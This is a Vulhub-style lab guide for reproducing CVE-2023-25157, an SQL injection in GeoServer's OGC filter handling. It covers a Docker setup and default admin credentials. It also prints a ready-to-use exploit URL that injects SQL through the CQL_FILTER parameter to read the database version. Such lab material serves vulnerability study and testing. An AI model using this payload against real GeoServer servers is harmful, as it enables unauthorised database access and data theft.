# GeoServer OGC Filter SQL Injection (CVE-2023-25157)

GeoServer is a J2EE implementation of the OpenGIS Web Server specifications. It can publish map data and allows users to update, delete, and insert feature data.

Versions 2.22.1, 2.21.4, and earlier contain SQL injection vulnerabilities in multiple OGC expressions.

Start GeoServer 2.22.1:

```bash
docker compose up -d
```

After the environment starts, visit `http://your-ip:8080/geoserver` to open the GeoServer home page.

## Reproduction

Before exploiting the vulnerability, the target server must have a PostGIS datastore and workspace. Vulhub already includes a matching workspace:

Credentials: `admin/geoserver`

```bash
Workspace name: vulhub
Data store name: pg
Feature type (table) name: example
One attribute from feature type: name
```

Use these known parameters to trigger the SQL injection with the following URL:

```
http://your-ip:8080/geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=vulhub:example&CQL_FILTER=strStartsWith%28name%2C%271%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+integer%29%29+--+%27%29+%3D+true
```

Reference:
https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2023-25157
